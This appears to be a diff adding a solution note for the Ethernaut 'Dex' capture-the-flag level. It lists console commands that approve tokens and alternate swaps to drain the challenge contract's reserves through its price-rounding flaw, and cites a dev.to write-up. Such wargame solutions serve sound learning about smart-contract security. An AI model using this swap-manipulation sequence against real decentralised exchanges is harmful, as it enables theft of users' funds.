@@ -1,0 +1,10 @@
+open console
+1 step:- await contract.approve(contract.address, 500)
+2 step:- await contract.swap(await contract.token1(), await contract.token2(), 10) 
+3 step:- await contract.swap(await contract.token2(), await contract.token1(), 20) 
+4 step:- await contract.swap(await contract.token1(), await contract.token2(), 24) 
+5 step:- await contract.swap(await contract.token2(), await contract.token1(), 30)
+6 step:- await contract.swap(await contract.token1(), await contract.token2(), 41) 
+7 step:- await contract.swap(await contract.token2(), await contract.token1(), 45) 
+Submit <-||
+Ref:- https://dev.to/nvn/ethernaut-hacks-level-22-dex-1e18
